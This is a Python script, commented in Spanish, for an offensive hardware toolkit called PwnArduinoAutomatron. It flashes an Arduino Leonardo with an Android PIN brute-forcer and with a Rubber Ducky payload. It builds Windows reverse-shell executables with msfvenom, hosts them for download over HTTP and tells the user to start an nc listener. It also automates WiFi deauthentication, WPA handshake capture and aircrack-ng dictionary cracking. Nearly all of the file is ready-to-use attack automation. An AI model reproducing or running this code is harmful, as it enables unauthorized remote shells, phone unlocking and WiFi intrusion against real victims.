import os
import subprocess

def instalacion_arduino_cli():
	if os.system("arduino-cli") != 0 and os.system("sudo arduino-cli") != 0:
		if os.popen('uname -m').read() == "x86_64":
			os.system("wget https://downloads.arduino.cc/arduino-cli/arduino-cli_latest_Linux_64bit.tar.gz")
			os.system("tar -xvf arduino-cli_latest_Linux_64bit.tar.gz")
			os.system("sudo cp arduino-cli /usr/bin/")
		else:
			os.system("wget https://downloads.arduino.cc/arduino-cli/arduino-cli_latest_Linux_32bit.tar.gz")
			os.system("tar -xvf arduino-cli_latest_Linux_32bit.tar.gz")
			os.system("sudo cp arduino-cli /usr/bin/")
	os.system("sudo arduino-cli core install arduino:avr")
	os.system("sudo arduino-cli core install arduino:samd")

def instalacion_arduino():
	if os.system("arduino") != 0 and os.system("sudo arduino") != 0:
		if os.popen('uname -m').read() == "x86_64":
			os.system("wget https://downloads.arduino.cc/arduino-nightly-linux64.tar.xz")
			os.system("tar -xf arduino-nightly-linux64.tar.xz")
		else:
			os.system("wget https://downloads.arduino.cc/arduino-nightly-linux32.tar.xz")
			os.system("tar -xf arduino-nightly-linux32.tar.xz")
		os.system("sudo ./arduino-nightly/install.sh")
def instalar_placas():
	# Para arduino leonardo
	os.system("sudo arduino-cli core install arduino:avr")
	os.system("sudo arduino-cli core install arduino:samd")
	# Para esp8266 se necesitara tener el esptool y el binario del deauther para la implementacion de los ataques
	if os.system("cd esptool") != 0:
		os.system("git clone https://github.com/espressif/esptool.git")
	if not os.path.exists("esp8266_deauther_V2_1M_Nightly.bin"):
		os.system("wget https://github.com/SpacehuhnTech/nightly-deauther/releases/download/nightly/esp8266_deauther_V2_1M_Nightly.bin")

def descarga_repositorio():
	if not os.path.exists("PwnArduinoAutomatron"):
		os.system("git clone https://github.com/diegojoel301/PwnArduinoAutomatron.git")

def creacion_de_laboratorio():
	instalacion_arduino()
	instalacion_arduino_cli()
	instalar_placas()
	descarga_repositorio()

def subir_codigo(puerto, directorio_ino):
	os.system(f"sudo arduino-cli compile --port {puerto} --fqbn arduino:avr:leonardo {directorio_ino} 1>/dev/null")
	os.system(f"sudo arduino-cli upload --port {puerto} --fqbn arduino:avr:leonardo {directorio_ino} 1>/dev/null")

def implementar_rompedor_de_pin():
	os.system("sudo arduino-cli board list")
	puerto = input("[+] En cual puerto esta tu Arduino Leonardo: ")
	subir_codigo(puerto, "PwnArduinoAutomatron/crack_pin_phone")
	#os.system(f"sudo arduino-cli compile --port {puerto} --fqbn arduino:avr:leonardo PwnArduinoAutomatron/crack_pin_phone 1>/dev/null")
	#os.system(f"sudo arduino-cli upload --port {puerto} --fqbn arduino:avr:leonardo PwnArduinoAutomatron/crack_pin_phone 1>/dev/null")

def implementar_deauther():
	os.system("sudo arduino-cli board list")
	puerto = input("[+] En cual puerto esta tu Esp8266 (Suele tener como nombre: unknow): ")
	os.system(f"sudo python3 esptool/esptool.py -p {puerto} -b 115200 write_flash 0 esp8266_deauther_V2_1M_Nightly.bin")
def implementar_rubber_ducky_rce(direccion_ip_atacante):
	if os.path.exists("rubber_ducky_rce.ino"):
		os.system("sudo rm rubber_ducky_rce.ino")

	archivo = open("rubber_ducky_rce.ino", "a")

	f = open("PwnArduinoAutomatron/rubber_ducky_rce/rubber_ducky_rce.ino", "r")
	Lines = f.readlines()

	for line in Lines:
		cad = line
		if "String direccion =" in cad:
			cad = f"String direccion = \"{direccion_ip_atacante}\";"
		archivo.write(cad)

	f.close()
	archivo.close()
	os.system("sudo rm PwnArduinoAutomatron/rubber_ducky_rce/rubber_ducky_rce.ino")
	os.system("sudo mv rubber_ducky_rce.ino PwnArduinoAutomatron/rubber_ducky_rce")
	os.system("sudo arduino-cli board list")
	puerto = input("[+] En cual puerto esta tu Arduino Leonardo: ")
	subir_codigo(puerto, "PwnArduinoAutomatron/rubber_ducky_rce")
	print("[+] Que arquitectura posee la maquina victima:")
	print("1) x86")
	print("2) x64")
	arquitectura = input("Introduce: ")
	puerto_tcp = input("[+] Introduce el puerto por el cual se realizara la conexion remota: ")
	if arquitectura == "2":
		os.system(f"msfvenom -p windows/x64/shell_reverse_tcp LHOST={direccion_ip_atacante} LPORT={puerto_tcp} -f exe > myshell.exe")
	else:
		os.system(f"msfvenom -p windows/shell_reverse_tcp LHOST={direccion_ip_atacante} LPORT={puerto_tcp} -f exe > myshell.exe")
	print("[!] Levantando servidor http para la descarga del binario malicioso...")
	os.system("sudo xterm -hold -e python3 -m http.server 80 &")
	print(f"[+] En otra consola ejecuta: nc -nlvp {puerto_tcp}")


def implementar_ataque_wifi():
	os.system("iwconfig")
	network_card = input("[+] Introduce nombre de tarjeta de red: ")
	os.system(f"sudo airmon-ng start {network_card}")
	os.system("sudo airmon-ng check kill")
	os.system("sudo xterm -hold -e /bin/bash -l -c \"sudo airodump-ng wlan0mon\" &")
	ssid = input("[+] Introduce el nombre del punto de acceso: ")
	chanel = input("[+] Introduce el canal del punto de acceso: ")
	print("[!] Ve a la pagina del esp8266: http://192.168.4.1/ y seleciona la red victima desde ahi")
	os.system(f"sudo xterm -hold -e airodump-ng -c {chanel} -w Captura --essid \"{ssid}\" wlan0mon &")
	wpa_handshake = input("[+] Introduce el Wpa Handshake: ")
	ruta_diccionario = input("[+] Introduce la ruta del diccionario para fuerza bruta: ")
	os.system(f"sudo xterm -hold -e aircrack-ng -a2 -b {wpa_handshake} -w {ruta_diccionario} *cap")
	os.system(f"sudo rm *csv")
	os.system(f"sudo rm *netxml")
	os.system("sudo airmon-ng stop wlan0mon")
	print("[!] Desconecta tu tarjeta de red, y vuelvela a conectar a la maquina")
	esta_conectada = "N"

	while not esta_conectada.upper() == "S":
		esta_conectada = input("[*] Esta conectada nuevamente tu tarjeta de red? (S/N): ")

	os.system(f"sudo ifconfig {network_card} up")



print("  _____                                  _       _                          _                        _                   ")
print(" |  __ \                   /\           | |     (_)              /\        | |                      | |                  ")
print(" | |__) |_      ___ __    /  \   _ __ __| |_   _ _ _ __   ___   /  \  _   _| |_ ___  _ __ ___   __ _| |_ _ __ ___  _ __  ")
print(" |  ___/\ \ /\ / / '_ \  / /\ \ | '__/ _` | | | | | '_ \ / _ \ / /\ \| | | | __/ _ \| '_ ` _ \ / _` | __| '__/ _ \| '_ \ ")
print(" | |     \ V  V /| | | |/ ____ \| | | (_| | |_| | | | | | (_) / ____ \ |_| | || (_) | | | | | | (_| | |_| | | (_) | | | |")
print(" |_|      \_/\_/ |_| |_/_/    \_\_|  \__,_|\__,_|_|_| |_|\___/_/    \_\__,_|\__\___/|_| |_| |_|\__,_|\__|_|  \___/|_| |_|")
print("Author: Diego Condori")

while True:
	print("1. Implementar Laboratorio")
	print("2. Implementar rompedor de bloqueo para android")
	print("3. Implementar rubber ducky para obtener RCE")
	print("4. Subir codigo para deauther al esp8266")
	print("5. Implementar ataque a una red wifi")
	print("6. Salir")
	opcion = input("[+] Introduce opcion: ")

	if opcion == "1":
		creacion_de_laboratorio()
	elif opcion == "2":
		print("[!] Conecta tu Arduino Leonardo")
		implementar_rompedor_de_pin()
	elif opcion == "3":
		print("[!] Conecta tu Arduino Leonardo")
		direccion_ip_atacante = input("[+] Introduce tu direccion ip a la cual te llegara el rev shell: ")
		implementar_rubber_ducky_rce(direccion_ip_atacante)
	elif opcion == "4":
		implementar_deauther()
	elif opcion == "5":
		implementar_ataque_wifi()
	elif opcion == "6":
		print("Quit..")
		break
	else:
		print("[!] Opcion Invalida")
